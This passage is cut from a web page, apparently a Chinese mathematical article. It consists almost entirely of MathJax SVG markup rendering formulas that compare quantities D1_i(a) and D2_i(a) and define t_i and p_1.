749Z"></path></g><g data-mml-node="mo" transform="translate(8831.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(9498.1,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(10553.8,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container></p><p>当<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.661ex;" xmlns="http://www.w3.org/2000/svg" width="14.653ex" height="2.548ex" role="img" focusable="false" viewBox="0 -833.9 6476.7 1126.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1264.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1653.6,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(2182.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2849.3,0)"><path data-c="3E" d="M84 520Q84 528 88 533T96 539L99 540Q106 540 253 471T544 334L687 265Q694 260 694 250T687 235Q685 233 395 96L107 -40H101Q83 -38 83 -20Q83 -19 83 -17Q82 -10 98 -1Q117 9 248 71Q326 108 378 132L626 250L378 368Q90 504 86 509Q84 513 84 520Z"></path></g><g data-mml-node="msubsup" transform="translate(3905.1,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(5169.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(5558.7,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(6087.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>时，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.661ex;" xmlns="http://www.w3.org/2000/svg" width="26.769ex" height="2.548ex" role="img" focusable="false" viewBox="0 -833.9 11831.8 1126.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(394,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(965.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2021.5,0)"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z"></path></g><g data-mml-node="mo" transform="translate(2854.5,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msubsup" transform="translate(3243.5,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(4508.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4897.1,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(5426.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5815.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msubsup" transform="translate(6259.7,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(7524.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(7913.3,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(8442.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(8831.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(9498.1,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(10553.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(11331.8,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container></p><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.768ex;" xmlns="http://www.w3.org/2000/svg" width="28.506ex" height="5.036ex" role="img" focusable="false" viewBox="0 -1002.7 12599.7 2226"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mn" transform="translate(536,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1217.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(2273.1,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="munder" transform="translate(2939.8,0)"><g data-mml-node="mo"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z"></path></g><g data-mml-node="TeXAtom" transform="translate(456.8,-1123.3) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g><g data-mml-node="mo" transform="translate(4383.8,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(4772.8,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msubsup" transform="translate(778,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mn" transform="translate(861,-287.9) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(2042.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(2431.6,0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(3181.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g><g data-mml-node="mo" transform="translate(8102.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msup" transform="translate(9103,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msubsup" transform="translate(778,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mn" 